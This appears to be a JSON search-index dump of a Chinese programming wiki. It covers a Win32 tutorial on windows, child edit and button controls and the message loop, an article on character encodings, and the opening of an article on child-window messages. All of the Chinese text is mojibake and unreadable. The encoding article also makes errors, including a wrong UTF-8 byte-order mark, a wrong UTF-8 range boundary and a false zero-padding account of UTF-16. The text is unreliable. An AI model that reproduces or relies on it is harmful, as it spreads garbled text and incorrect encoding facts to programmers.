hPrevInstance, // å‰ä¸€ä¸ªå®ä¾‹çš„å¥æŸ„ï¼Œä¸å†ä½¿ç”¨ LPSTR lpCmdLine, // å‘½ä»¤è¡Œå‚æ•° int nCmdShow) // æ§åˆ¶çª—å£æ˜¾ç¤ºæ–¹å¼çš„æ ‡å¿—&#123; g_hInstance = hInstance; // 1. å®šä¹‰è¦åˆ›å»ºçš„çª—å£æ˜¯ä»€ä¹ˆæ ·çš„ WNDCLASS wndClass = &#123; 0 &#125;; // åˆ›å»ºWNDCLASSçª—å£ç±»å¯¹è±¡ï¼Œåˆå§‹åŒ–å¡«å……ä¸º0 wndClass.hbrBackground = (HBRUSH)COLOR_BACKGROUND; // çª—å£èƒŒæ™¯é¢œè‰² TCHAR className[] = TEXT(&quot;My First Window&quot;); wndClass.lpszClassName = className; // çª—å£ç±»å wndClass.hInstance = hInstance; // çª—å£å®ä¾‹å¥æŸ„ï¼Œçª—å£å±äºå“ªä¸ªè¿›ç¨‹ï¼Œå½“å‰è¿›ç¨‹å°±æ˜¯WinMainå‡½æ•°å‚æ•°hInstance wndClass.lpfnWndProc = WindowProc; // çª—å£è¿‡ç¨‹å‡½æ•° // 2. åˆ›å»ºå¹¶æ˜¾ç¤ºçª—å£ RegisterClass(&amp;wndClass); // æ³¨å†Œçª—å£ç±» HWND hWnd = CreateWindow(className, // çª—å£ç±»å TEXT(&quot;çª—å£&quot;), // çª—å£æ ‡é¢˜ WS_OVERLAPPEDWINDOW, // çª—å£æ ·å¼ 10, 10, // çª—å£ä½ç½® ç›¸å¯¹äºçˆ¶çª—å£çš„xåæ ‡å’Œyåæ ‡æ˜¯ä»€ä¹ˆ 600, 300, // çª—å£å¤§å° NULL, NULL, // çˆ¶çª—å£å¥æŸ„å’Œèœå•å¥æŸ„ è¿™ä¸ªçª—å£æ²¡æœ‰çˆ¶çª—å£ï¼Œå†™ç©ºï¼›ä¸éœ€è¦èœå•ï¼Œå†™ç©º hInstance, // å®ä¾‹å¥æŸ„ NULL); // é™„åŠ å‚æ•° æ²¡ï¼Œå¡«ç©º char szOutBuff[0x80]; if (hWnd == NULL) &#123; sprintf(szOutBuff, &quot;Error: %d&quot;, GetLastError()); OutputDebugString(szOutBuff); return 0; &#125; ShowWindow(hWnd, SW_SHOW); // æ˜¾ç¤ºçª—å£ // 3. æ¥æ”¶æ¶ˆæ¯å¹¶å¤„ç† MSG msg; BOOL bRet; while ((bRet = GetMessage(&amp;msg, NULL, 0, 0) ) != 0) // æ¶ˆæ¯å¾ªç¯ &#123; if (bRet == -1) &#123; sprintf(szOutBuff, &quot;Error: %d&quot;, GetLastError()); OutputDebugString(szOutBuff); return 0; &#125; else &#123; //TranslateMessage(&amp;msg); // ç¿»è¯‘æ¶ˆæ¯ DispatchMessage(&amp;msg); // åˆ†å‘æ¶ˆæ¯ &#125; &#125; return 0;&#125;LRESULT CALLBACK WindowProc(HWND hwnd, // çª—å£å¥æŸ„ UINT uMsg, // æ¶ˆæ¯æ ‡è¯† WPARAM wParam, // é™„åŠ æ¶ˆæ¯ä¿¡æ¯ LPARAM lParam) // é™„åŠ æ¶ˆæ¯ä¿¡æ¯&#123; switch (uMsg) &#123; // å½“çª—å£åˆ›å»ºæ—¶ï¼Œåˆ›å»ºå­çª—å£æ§ä»¶ case WM_CREATE: &#123; // åˆ›å»ºç¼–è¾‘æ¡† CreateWindow( TEXT(&quot;EDIT&quot;), // lpClassName: çª—å£ç±»åï¼Œè¿™é‡Œæ˜¯é¢„å®šä¹‰çš„ç¼–è¾‘æ¡†ç±» TEXT(&quot;&quot;), // lpWindowName: çª—å£æ ‡é¢˜ï¼Œè¿™é‡Œä¸ºç©ºå­—ç¬¦ä¸²ï¼Œå› ä¸ºç¼–è¾‘æ¡†é€šå¸¸ä¸éœ€è¦æ ‡é¢˜ WS_CHILD | WS_VISIBLE | WS_VSCROLL | ES_MULTILINE, // dwStyle: çª—å£æ ·å¼ï¼Œè¿™é‡ŒåŒ…æ‹¬å­çª—å£ã€å¯è§ã€å‚ç›´æ»šåŠ¨æ¡å’Œå¤šè¡Œç¼–è¾‘æ¡† 0, // x: çª—å£çš„æ°´å¹³ä½ç½®ï¼Œç›¸å¯¹äºçˆ¶çª—å£ 0, // y: çª—å£çš„å‚ç›´ä½ç½®ï¼Œç›¸å¯¹äºçˆ¶çª—å£ 400, // nWidth: çª—å£çš„å®½åº¦ 300, // nHeight: çª—å£çš„é«˜åº¦ hwnd, // hWndParent: çˆ¶çª—å£å¥æŸ„ï¼Œè¿™é‡Œæ˜¯WM_CREATEæ¶ˆæ¯ä¸­æ¥æ”¶åˆ°çš„çª—å£å¥æŸ„ (HMENU)IDC_EDIT_1, // hMenu: å­çª—å£IDï¼Œå¼ºè½¬ä¸ºHMENUç±»å‹ g_hInstance, // hInstance: çª—å£å®ä¾‹å¥æŸ„ NULL // lpParam: æŒ‡å‘åˆ›å»ºçª—å£æ—¶ä¼ é€’çš„å€¼çš„æŒ‡é’ˆï¼Œè¿™é‡Œä¸ºNULL ); // åˆ›å»º&quot;è®¾ç½®&quot;æŒ‰é’® CreateWindow( TEXT(&quot;BUTTON&quot;), // lpClassName: çª—å£ç±»åï¼Œè¿™é‡Œæ˜¯é¢„å®šä¹‰çš„æŒ‰é’®ç±» TEXT(&quot;è®¾ç½®&quot;), // lpWindowName: æŒ‰é’®ä¸Šçš„æ–‡å­— WS_CHILD | WS_VISIBLE, // dwStyle: çª—å£æ ·å¼ï¼Œè¿™é‡ŒåŒ…æ‹¬å­çª—å£å’Œå¯è§ 450, // x: æ°´å¹³ä½ç½® 150, // y: å‚ç›´ä½ç½® 80, // nWidth: å®½åº¦ 20, // nHeight: é«˜åº¦ hwnd, // hWndParent: çˆ¶çª—å£å¥æŸ„ (HMENU)IDC_BUTTON_1, // hMenu: å­çª—å£IDï¼Œå¼ºè½¬ä¸ºHMENUç±»å‹ g_hInstance, // hInstance: å®ä¾‹å¥æŸ„ NULL // lpParam: åˆ›å»ºçª—å£æ—¶ä¼ é€’çš„å€¼ï¼Œè¿™é‡Œä¸ºNULL ); // åˆ›å»º&quot;è·å–&quot;æŒ‰é’® CreateWindow( TEXT(&quot;BUTTON&quot;), // lpClassName: çª—å£ç±»åï¼ŒåŒæ ·æ˜¯æŒ‰é’®ç±» TEXT(&quot;è·å–&quot;), // lpWindowName: æŒ‰é’®ä¸Šçš„æ–‡å­— WS_CHILD | WS_VISIBLE, // dwStyle: çª—å£æ ·å¼ 450, // x: æ°´å¹³ä½ç½® 100, // y: å‚ç›´ä½ç½® 80, // nWidth: å®½åº¦ 20, // nHeight: é«˜åº¦ hwnd, // hWndParent: çˆ¶çª—å£å¥æŸ„ (HMENU)IDC_BUTTON_2, // hMenu: å­çª—å£IDï¼Œå¼ºè½¬ä¸ºHMENUç±»å‹ g_hInstance, // hInstance: å®ä¾‹å¥æŸ„ NULL // lpParam: åˆ›å»ºçª—å£æ—¶ä¼ é€’çš„å€¼ ); break; &#125; // å½“æŒ‰é’®è¢«ç‚¹å‡» case WM_COMMAND: &#123; // æ¶ˆæ¯ä¸ºWM_COMMANDæ—¶ï¼ŒwParamå‚æ•°çš„ä½16ä½ä¸­ä¸ºèœå•ID //ä½¿ç”¨LOWORDå®è·è·å–wParamå‚æ•°ä½16ä½ switch (LOWORD(wParam)) &#123; // å½“æŒ‰é’®ä¸ºè®¾ç½® case IDC_BUTTON_1: &#123; // SetDlgItemTextå‡½æ•°ä¿®æ”¹ç¼–è¾‘æ¡†å†…å®¹ SetDlgItemText(hwnd, (int)IDC_EDIT_1, TEXT(&quot;æµ‹è¯•&quot;)); break; &#125; // å½“æŒ‰é’®ä¸ºè·å– case IDC_BUTTON_2: &#123; TCHAR szEditBuffer[0x80]; GetDlgItemText(hwnd, (int)IDC_EDIT_1, szEditBuffer, 0x80); //è·å–ç¼–è¾‘æ¡†ä¸­å†…å®¹ MessageBox(NULL, szEditBuffer, NULL, NULL); break; &#125; &#125; break; &#125; &#125; return DefWindowProc(hwnd, uMsg, wParam, lParam); // é»˜è®¤çª—å£å¤„ç†å‡½æ•°&#125; å°ç»“ å­¦ä¹ Windowså›¾å½¢ç¼–ç¨‹æ˜¯ä¸ºäº†ä½“ä¼šæ¶ˆæ¯æœºåˆ¶ï¼Œä¾¿äºåç»­å­¦ä¹ MFCï¼ˆå¯¹win32è¿›è¡Œå°è£…ï¼‰ å­çª—å£æ§ä»¶æ˜¯windowsé¢„å…ˆå®šä¹‰å¥½çš„ä¸€äº›çª—å£ï¼Œå¯ä»¥ç›´æ¥æ‹¿æ¥ä½¿ç”¨ã€‚å­çª—å£çŸ¥é“è‡ªå·±çš„çŠ¶æ€å‘ç”Ÿæ”¹å˜ï¼Œå¼€å‘è€…åˆ›å»ºå¥½å­çª—å£åï¼Œåœ¨çˆ¶çª—å£çš„å›è°ƒå‡½æ•°ä¸­å¤„ç†å­çª—å£çš„äº§ç”Ÿçš„æ¶ˆæ¯ å­çª—å£æ§ä»¶é€šè¿‡èœå•IDï¼ˆMenu IDï¼‰è¿›è¡ŒåŒºåˆ† tipsï¼šä¸çŸ¥é“å¯¹çª—å£æŸä¸ªæ“ä½œæ‰€äº§ç”Ÿçš„æ¶ˆæ¯æ˜¯ä»€ä¹ˆï¼Œå¯ä»¥åœ¨å›è°ƒå‡½æ•°ä¸­æ‰“å°å‡ºæ¥ï¼Œç„¶åå–æŸ¥æ–‡æ¡£ 123char szOutBuff[0x80];sprintf(szOutBuff, &quot;Message: %x - %x &quot;, hwnd, uMsg);OutputDebugString(szOutBuff);"},{"title":"å­—ç¬¦ç¼–ç ","path":"/wiki/Windows_API/å­—ç¬¦ç¼–ç .html","content":"å­—ç¬¦çš„æœ¬è´¨æ˜¯æŸ¥è¡¨ï¼Œå­—ç¬¦å’Œæ•°å€¼ä¹‹é—´çš„æ˜ å°„ã€‚ wiki-Cè¯­è¨€-å­—ç¬¦å’Œå­—ç¬¦ä¸²æ–‡ç« é‡Œå†™è¿‡ä¸€äº›ï¼Œæ‰€ä»¥æœ¬æ–‡å‰é¢æœ‰äº›å†…å®¹å°±ç®€ç•¥å†™å†™äº†ã€‚ ASCIIè¡¨ American Standard Code for Information Interchangeç¾å›½æ ‡å‡†ä¿¡æ¯äº¤æ¢ä»£ç  æ ‡å‡†ASCIIè¡¨ç”¨çš„7ä½äºŒè¿›åˆ¶æ•°æ¥è¡¨ç¤ºæ‰€æœ‰çš„å¤§å†™å’Œå°å†™å­—æ¯ï¼Œæ•°å­— 0 åˆ° 9ã€æ ‡ç‚¹ç¬¦å·ï¼Œä»¥åŠåœ¨ç¾å¼è‹±è¯­ä¸­ä½¿ç”¨çš„ç‰¹æ®Šæ§åˆ¶å­—ç¬¦ï¼Œå…±128ä¸ªå­—ç¬¦ã€‚ æ‰©å±•ASCIIè¡¨(Extended ASCII) æ—©æœŸå°å‹è®¡ç®—æœºå‘å±•æ—¶ï¼Œèƒ½å°†æœ€é«˜ä½ä¹Ÿåˆ©ç”¨èµ·æ¥ï¼Œ8ä½å­—èŠ‚çš„æ ‡å‡†å¾—ä»¥å·©å›ºã€‚æ‰©å……å­—ç¬¦çš„ç¼–ç å‡ä¸ºé«˜ä½ä¸º1çš„8ä½ä»£ç ï¼ˆå³åè¿›åˆ¶æ•°128ä¸€255 )ï¼Œç§°ä¸ºæ‰©å±•ASClIç ã€‚æ‰©å±•ASCIIç æ‰€å¢åŠ çš„å­—ç¬¦åŒ…æ‹¬åŠ æ¡†æ–‡å­—ã€åœ†åœˆå’Œå…¶ä»–å›¾å½¢ç¬¦å·ã€‚ æ ‡å‡†ASCIIè¡¨æœ€é«˜ä½ä¸º0ï¼Œæ‰©å±•ASCIIè¡¨è¡¥å……çš„128ä¸ªå­—ç¬¦æœ€é«˜ä½ä¸º1ã€‚ GB2312æˆ–GB2312-80 å¦‚æœæ˜¯ä½¿ç”¨è±¡å½¢æ–‡å­—çš„å›½å®¶ï¼Œåƒä¸­æ–‡ï¼Œå³ä½¿8ä½å…¨ç”¨ä¸Šï¼Œä¹Ÿåªèƒ½è¡¨ç¤º256ä¸ªå­—ç¬¦ã€‚å¹¶ä¸”æœ€é«˜ä½æ‰©å……çš„è¿™äº›å­—ç¬¦ï¼ˆå³åè¿›åˆ¶æ•°128ä¸€255)ï¼Œåœ¨å¤©æœå‡ ä¹ç”¨ä¸ä¸Šï¼Œäºæ˜¯å¯¹æœ€é«˜ä½æ‰©å……çš„è¿™äº›å­—ç¬¦é‡æ–°è¿›è¡Œç¼–ç ï¼Œå¹¶ç”¨ä¸¤ä¸ªå­—èŠ‚æ¥è¡¨ç¤ºä¸€ä¸ªæ±‰å­—ï¼Œå³å°äº127çš„å­—ç¬¦æ„ä¹‰ä¸åŸæ¥ç›¸åŒï¼Œå½“ä¸¤ä¸ªå¤§äº127çš„å­—ç¬¦è¿åœ¨ä¸€èµ·æ—¶ï¼Œå°±è¡¨ç¤ºä¸€ä¸ªæ±‰å­—ã€‚ç”¨åŒºå’Œä½æ¥å®šä½ï¼Œè¿™å°±æ˜¯GB2312æˆ–GB2312-80ï¼Œä¹Ÿå«æ±‰å­—å›½æ ‡ç ã€‚ Unicode ä¸ºäº†è§£å†³GB2312æˆ–GB2312-80çš„å¼Šç«¯ï¼ŒUnicodeè¯ç”Ÿäº†ï¼Œæ‹¿ä¸€å¼ å¤§è¡¨ï¼Œå°†ä¸–ç•Œä¸Šæ‰€æœ‰ä¹¦é¢è¯­è¨€å¸¸ç”¨çš„å­—ç¬¦å’Œè±¡å½¢æ–‡å­—éƒ½ç¼–è¿›æ¥ã€‚Unicodeçš„ç¼–ç èŒƒå›´æ˜¯ï¼š0-0x10FFFFï¼Œå¯ä»¥å®¹çº³100å¤šä¸‡ä¸ªç¬¦å·ã€‚ Unicodeè¿™å¼ è¡¨æ˜¯å”¯ä¸€çš„ï¼Œæ‰€ä»¥ä¸ä¼šå‡ºç°ä¹±ç çš„é—®é¢˜ï¼ˆå¯¼è‡´ä¹±ç çš„åŸå› æ˜¯å¤šä¸ªå­—ç¬¦å¯¹åº”åŒä¸€ä¸ªäºŒè¿›åˆ¶æ•°ã€‚ï¼‰ã€‚ âš ï¸æ³¨æ„ï¼šUnicodeåªæ˜¯ä¸€ç§ç¼–ç æ–¹æ¡ˆï¼ˆç¬¦å·èƒŒåå¯¹åº”çš„äºŒè¿›åˆ¶æ•°ï¼‰ï¼Œå¹¶æ²¡æœ‰è¯´æ˜è¿™ä¸ªäºŒè¿›åˆ¶æ•°åº”è¯¥å¦‚ä½•å­˜å‚¨ã€‚ UTF-16å’ŒUTF-8æ˜¯Unicodeçš„å­˜å‚¨å®ç°æ–¹å¼ï¼Œè¯´æ˜äº†è¿™äº›äºŒè¿›åˆ¶æ•°è¯¥æ€ä¹ˆå­˜åˆ°è®¡ç®—æœºä¸Šã€‚ UTF-16 UTF-16ç¼–ç æ˜¯ä»¥16ä¸ªæ— ç¬¦å·æ•´æ•°ï¼ˆ2ä¸ªå­—èŠ‚ï¼‰ä¸º1ä¸ªåŸºæœ¬å•ä½ï¼Œå°é¡¶2ä¸ªå•ä½ï¼Œå³4ä¸ªå­—èŠ‚ã€‚å¦‚ï¼š æŸä¸ªå­—ç¬¦ç”¨Unicodeç¼–ç è¡¨ç¤ºæ˜¯8ä½ï¼Œç”¨utf-16å­˜éœ€è¦å¯¹é½ï¼Œå†è¡¥ä¸Š1ä¸ªå­—èŠ‚ï¼Œæœ€ç»ˆæ˜¯ç”¨2ä¸ªå­—èŠ‚æ¥è¡¨ç¤º æŸä¸ªå­—ç¬¦ç”¨Unicodeç¼–ç è¡¨ç¤ºæ˜¯3ä¸ªå­—èŠ‚ï¼Œç”¨utf-16å­˜éœ€è¦å¯¹é½ï¼Œå†è¡¥ä¸Š1ä¸ªå­—èŠ‚ï¼Œæœ€ç»ˆæ˜¯ç”¨4ä¸ªå­—èŠ‚æ¥è¡¨ç¤º ç°åœ¨æœºå™¨ä¸Šçš„Unicodeç¼–ç ä¸€èˆ¬æŒ‡çš„å°±æ˜¯UTF-16ï¼Œæ‰€ä»¥å¤§å®¶ä¹ æƒ¯åœ°å°†Unicodeå’ŒUTF-16æ··ä¸ºä¸€è°ˆäº†ã€‚å¦‚æœé—®â€œUnicodeå­—ç¬¦æ˜¯ç”¨å¤šå°‘ä¸ªå­—èŠ‚æ¥è¡¨ç¤ºâ€ï¼Œå› ä¸ºä¸çŸ¥é“å­˜å‚¨æ–¹æ¡ˆï¼Œè¿™ä¸ªé—®é¢˜æ˜¯æ— æ³•å›ç­”çš„ æ¯”å¦‚å­—ç¬¦â€™Aâ€™ï¼ŒUnicodeç¼–ç æ˜¯0x41hï¼Œè¦è¡¥é½åˆ°2ä¸ªå­—èŠ‚ï¼Œäºæ˜¯å­˜å‚¨çš„æ˜¯ï¼š0x00 0x41h æ¯”å¦‚æ±‰å­—â€™ä¸­â€™ï¼ŒUnicodeç¼–ç æ˜¯0x4E 0x2Dï¼Œå·²ç»æ˜¯ä¸¤ä¸ªå­—ç¬¦äº†ï¼Œäºæ˜¯å­˜å‚¨çš„æ˜¯ï¼š0x4E 0x2D æ¯”å¦‚æŸä¸ªç¬¦å·â€™é€†â€™ï¼ˆå‡è®¾çš„ï¼Œæ‡’å¾—æ‰¾äº†ï¼‰ï¼ŒUnicodeç¼–ç æ˜¯0x4E 0x2D 0x7Aï¼Œä¸‰ä¸ªå­—ç¬¦ï¼Œè¦è¡¥é½ï¼Œäºæ˜¯æœ€ç»ˆå­˜å‚¨çš„æ˜¯ï¼š0x00 0x4E 0x2D 0x7A æœ€å¤šæ˜¯4ä¸ªå­—èŠ‚è¡¨ç¤ºï¼Œå› ä¸º4ä¸ªå­—èŠ‚å·²ç»èƒ½è¡¨ç¤ºå®Œä¸–ç•Œä¸Šå¸¸ç”¨çš„å­—ç¬¦äº† UTF-16LEï¼ˆå°ç«¯å­˜å‚¨ï¼‰UTF-16BEï¼ˆå¤§ç«¯å­˜å‚¨ï¼‰ UTF-16çš„ä¼˜ç‚¹ï¼šè®¡ç®—ã€æ‹†åˆ†ã€è§£æéå¸¸æ–¹ä¾¿ï¼Œ2ä¸ªå­—èŠ‚ä¸ºä¸€ä¸ªå•ä½ï¼Œä¸€ä¸ªä¸€ä¸ªæ¥ã€‚ UTF-16çš„ç¼ºç‚¹ï¼šUTF-16ä¼šå­˜åœ¨æµªè´¹ç©ºé—´çš„æƒ…å†µã€‚ å› ä¸ºUTF-16æ˜¯ä¸¤ä¸ªå­—èŠ‚ä¸ºä¸€ä¸ªåŸºæœ¬å•ä½ï¼Œè®¸å¤šå¸¸è§å­—ç¬¦å®é™…ä¸Šåªéœ€è¦ä¸€ä¸ªå­—èŠ‚ã€‚æ¯”å¦‚å­—ç¬¦â€™Aâ€™ï¼ŒUnicodeç¼–ç æ˜¯0x41hï¼Œåªéœ€è¦1ä¸ªå­—èŠ‚å°±èƒ½è¡¨ç¤ºã€‚ä½†ä½¿ç”¨UTF-16éœ€è¦è¡¥é½åˆ°2ä¸ªå­—èŠ‚ã€‚åœ¨æœ¬åœ°å­˜å‚¨æ˜¯æ— æ‰€è°“çš„ï¼Œå°±æ˜¯æµªè´¹ç‚¹ç¡¬ç›˜ç©ºé—´ã€‚ä½†å¦‚æœæ˜¯ç½‘ç»œä¼ è¾“ï¼Œä¼šå¯¼è‡´æ›´å¤§çš„ä¼ è¾“å¼€é”€ã€‚è€ŒUTF-8æä¾›äº†ä¸€ç§å˜é•¿çš„å­˜å‚¨æ–¹æ¡ˆï¼Œå¯ä»¥è§£å†³utf-16å¯¼è‡´çš„å­˜å‚¨å’Œä¼ è¾“å¼€é”€ã€‚ UTF-8 UTF-8ï¼ˆ8-bit Unicode Transformation Formatï¼‰æ˜¯ä¸€ç§å¯å˜é•¿åº¦çš„å­˜å‚¨æ–¹æ¡ˆï¼Œå®ƒçš„å­˜å‚¨æ–¹æ¡ˆæ˜¯æ ¹æ®å­—ç¬¦çš„ç¼–ç æ¥å†³å®šç”¨å¤šä¸ªä¸ªå­—èŠ‚ï¼ˆ1~4ï¼‰æ¥å­˜å‚¨ï¼Œè§„åˆ™å¦‚ä¸‹ï¼š Unicodeç¼–ç ï¼ˆ16è¿›åˆ¶ï¼‰ UTF-8 å­—èŠ‚æµï¼ˆäºŒè¿›åˆ¶ï¼‰ 0x000000-0x00007F 0XXXXXXX 0x000080-0x0007FF 110XXXXX 10XXXXXX 0x000800-0x000FFF 1110XXXX 10XXXXXX 10XXXXXX 0x010000-0x10FFFF 11110XXX 10XXXXXX 10XXXXXX 10XXXXXX è¡¨æ ¼é‡Œçš„Xè¡¨ç¤ºå ä½ç¬¦ æ¯ç»„å‰é¢é‚£ä¸ªæ˜¯ç‰¹å®šçš„æ ‡è®°ä½ï¼š11110ï¼ˆå¯¹äºç¬¬ä¸€ç»„ï¼‰ï¼Œ10ï¼ˆå¯¹äºå…¶ä½™çš„ç»„ï¼‰ æ¯”å¦‚å­—ç¬¦â€™Aâ€™ï¼ŒUnicodeç¼–ç æ˜¯0x41hï¼Œåœ¨0x000000 - 0x00007FèŒƒå›´ä¹‹é—´ï¼Œé‡‡ç”¨0XXXXXXçš„æ–¹å¼è¿›è¡Œå­˜å‚¨ï¼Œå†™æˆåå…­è¿›åˆ¶è¿˜æ˜¯0x41hï¼Œå’ŒåŸæ¥ä¸€æ ·ã€‚ æ¯”å¦‚æ±‰å­—â€™ä¸­â€™ï¼ŒUnicodeç¼–ç æ˜¯0x4E 0x2Dï¼Œåœ¨0x000800 - 0x00FFFFèŒƒå›´ä¹‹é—´ï¼ŒæŒ‰1110XXXX 10XXXXXX 10XXXXXXæ¥å­˜ï¼Œè½¬æ¢è¿‡ç¨‹å¦‚ä¸‹ï¼š 1234560x4E 0x2D //&#x27;ä¸­&#x27;çš„Unicodeç¼–ç ï¼Œåå…­è¿›åˆ¶è¡¨ç¤º0100 1110 0010 1101 //æ‹†æˆäºŒè¿›åˆ¶1110XXXX 10XXXXXX 10XXXXXX //utf-8å­˜å‚¨æ–¹æ¡ˆï¼ŒXæ˜¯å ä½ç¬¦ï¼Œæ•°å­—10é‚£äº›æ˜¯æ ‡è®°ä½ï¼Œæ˜¯å›ºå®šçš„1110(0100) 10(111000) 10(101101) //å°†ç¬¬äºŒè¡Œçš„äºŒè¿›åˆ¶å†™å…¥åˆ°Xä¸­ï¼Œ()èµ·æ¥è¡¨ç¤ºçš„æ˜¯å¡«è¿›å»çš„E4 B8 AD //ç”¨åå…­è¿›åˆ¶è¡¨ç¤º UTF-8ä¸åˆ†å¤§å°ç«¯ï¼Œå› ä¸ºæ˜¯å˜é•¿çš„UTF-8ç¼–ç å­˜å‚¨æ–‡æœ¬æ—¶ä¸åŒºåˆ†å¤§ç«¯ï¼ˆBig Endianï¼‰å’Œå°ç«¯ï¼ˆLittle Endianï¼‰ã€‚è¿™æ˜¯å› ä¸ºUTF-8ç¼–ç çš„ç‰¹æ®Šæ€§è´¨å†³å®šçš„ï¼šå­—èŠ‚é¡ºåºæ— å…³æ€§ï¼š åœ¨UTF-8ä¸­ï¼Œæ¯ä¸ªå­—ç¬¦å¯èƒ½ç”±ä¸€ä¸ªåˆ°å››ä¸ªå­—èŠ‚ç»„æˆã€‚æ¯ä¸ªå­—èŠ‚æ˜¯ç‹¬ç«‹çš„ï¼Œå¹¶ä¸”å…¶é¡ºåºåœ¨å®šä¹‰å­—ç¬¦æ—¶æ˜¯å›ºå®šçš„ã€‚è¿™æ„å‘³ç€æ— è®ºåœ¨ä»€ä¹ˆç±»å‹çš„ç³»ç»Ÿä¸­ï¼ˆæ— è®ºæ˜¯å¤§ç«¯è¿˜æ˜¯å°ç«¯ï¼‰ï¼ŒUTF-8ç¼–ç çš„æ–‡æœ¬éƒ½æ˜¯ç›¸åŒçš„ã€‚è‡ªåŒæ­¥æ€§è´¨ï¼š UTF-8çš„è®¾è®¡ä½¿å¾—åœ¨ä»»ä½•å­—èŠ‚åºåˆ—ä¸­ï¼Œä»ä»»ä½•ç‚¹å¼€å§‹éƒ½èƒ½å‡†ç¡®åœ°ç¡®å®šä»»ä½•å­—ç¬¦çš„å¼€å§‹å’Œç»“æŸã€‚æ¯ä¸ªå­—èŠ‚çš„é«˜ä½ç”¨äºæ ‡è¯†å®ƒæ˜¯ä¸€ä¸ªå•ç‹¬çš„å­—ç¬¦ã€å¤šå­—èŠ‚åºåˆ—çš„å¼€å§‹å­—èŠ‚ï¼Œè¿˜æ˜¯å¤šå­—èŠ‚åºåˆ—ä¸­çš„åç»­å­—èŠ‚ã€‚ç”±äºè¿™äº›ç‰¹æ€§ï¼ŒUTF-8ç¼–ç çš„æ–‡æœ¬ä¸éœ€è¦åƒUTF-16æˆ–UTF-32é‚£æ ·æŒ‡å®šå­—èŠ‚åºã€‚åœ¨UTF-16å’ŒUTF-32ä¸­ï¼Œç›¸åŒçš„å­—ç¬¦å¯ä»¥æœ‰ä¸¤ç§ä¸åŒçš„è¡¨ç¤ºæ–¹å¼ï¼ˆå¤§ç«¯å’Œå°ç«¯ï¼‰ï¼Œå› æ­¤éœ€è¦æ˜ç¡®å­—èŠ‚åºã€‚ä¾‹å¦‚ï¼Œä½¿ç”¨BOMï¼ˆå­—èŠ‚é¡ºåºæ ‡è®°ï¼‰æ¥æŒ‡ç¤ºç¼–ç ä½¿ç”¨çš„æ˜¯å¤§ç«¯è¿˜æ˜¯å°ç«¯æ ¼å¼ã€‚ç®€è€Œè¨€ä¹‹ï¼ŒUTF-8çš„è®¾è®¡å¤©ç”Ÿå°±æ˜¯å­—èŠ‚é¡ºåºæ— å…³çš„ï¼Œå› æ­¤æ²¡æœ‰å¤§ç«¯æˆ–å°ç«¯ä¹‹åˆ†ã€‚ BOMï¼ˆByte Order Markï¼‰ ä½äºæ–‡æœ¬æ–‡ä»¶èµ·å§‹ä½ç½®å¼€å¤´ï¼Œç”¨äºæ ‡è¯†è¯¥Unicodeæ–‡ä»¶çš„ç¼–ç ç±»å‹ UTF-8 EF EB BF UTF-16LEï¼ˆå°ç«¯å­˜å‚¨ï¼‰ FF FE UTF-16BEï¼ˆå¤§ç«¯å­˜å‚¨ï¼‰ FE FF ä¾‹ï¼Œæ–‡æœ¬å†…å®¹éƒ½æ˜¯Aä¸­ å¦‚æœè®°äº‹æœ¬ä¸­å¦å­˜ä¸ºæ—¶å³ä¸‹è§’çš„ç¼–ç æ²¡æœ‰UTF-16ï¼Œæœ‰Unicodeé‚£ä¸€é¡¹ï¼Œé‚£å°±æ˜¯è¡¨ç¤ºytf-16ã€‚å› ä¸ºä¸€èˆ¬æ¥è¯´Unicodeç¼–ç ä½¿ç”¨utf-16æ¥å®ç°ï¼Œæ‰€ä»¥è¯´Unicodeå¤§å®¶é»˜è®¤è®¤ä¸ºæ˜¯utf-16ï¼Œå®é™…ä¸Šutf-16åªæ˜¯Unicodeçš„ä¸€ç§å­˜å‚¨æ–¹å¼ UTF-8UTF-16LEï¼ˆå°ç«¯å­˜å‚¨ï¼‰UTF-16BEï¼ˆå¤§ç«¯å­˜å‚¨ï¼‰è®°äº‹æœ¬å¦å­˜ä¸ºé€‰æ‹©å¸¦æœ‰BOMçš„UTF-8 è®°äº‹æœ¬å¦å­˜ä¸ºé€‰æ‹©UTF-16LE è®°äº‹æœ¬å¦å­˜ä¸ºé€‰æ‹©UTF-16BE"},{"title":"å­çª—å£æ¶ˆæ¯å¤„ç†é€»è¾‘åŠé€†å‘åˆ†æ","path":"/wiki/Windows_API/å­çª—å£æ¶ˆæ¯å¤„ç†é€»è¾‘åŠé€†å‘åˆ†æ.html","content":"æŒ‰é’®æ˜¯ä»€ä¹ˆ è¿™æ¬¡æˆ‘ä»¬é€šè¿‡åœ¨CreateWindowåˆ›å»ºä¸»çª—å£åç”¨CreateWindowåˆ›å»ºæŒ‰é’®çš„æ–¹å¼æ¥æ¥åˆ›å»ºå­çª—å£ CreateWindowåˆ›å»ºæŒ‰é’®æ—¶æœ‰ä¸ªå‚æ•°è¦å¡«çˆ¶çª—å£çš„å¥æŸ„ï¼Œæ‰€ä»¥CreateWindowå­çª—å£çš„ä»£ç è¦æ”¾åœ¨çˆ¶çª—å£hwndè¢«åˆ›å»ºå‡ºæ¥çš„åé¢ ä»£ç å®Œæ•´ä»£ç diff123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;#pragma warning(disable : 4996)LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);void CreateButton(HWND hwnd);HINSTANCE g_hInstance;int APIENTRY WinMain(HINSTANCE hInstance, // å½“å‰ç¨‹åºå®ä¾‹çš„å¥æŸ„ HINSTANCE hPrevInstance, // å‰ä¸€ä¸ªå®ä¾‹çš„å¥æŸ„ï¼Œä¸å†ä½¿ç”¨ LPSTR lpCmdLine, // å‘½ä»¤è¡Œå‚æ•° int nCmdShow) // æ§åˆ¶çª—å£æ˜¾ç¤ºæ–¹å¼çš„æ ‡å¿—&#123; g_hInstance = hInstance; // 1. å®šä¹‰è¦åˆ›å»ºçš„çª—å£æ˜¯ä»€ä¹ˆæ ·çš„ WNDCLASS wndClass = &#123; 0 &#125;; // åˆ›å»ºWNDCLASSçª—å£ç±»å¯¹è±¡ï¼Œåˆå§‹åŒ–å¡«å……ä¸º0 wndClass.hbrBackground = (HBRUSH)COLOR_BACKGROUND; // çª—å£èƒŒæ™¯é¢œè‰² TCHAR className[] = TEXT(&quot;My First Window&quot;); wndClass.lpszClassName = className; // çª—å£ç±»å wndClass.hInstance = hInstance; // 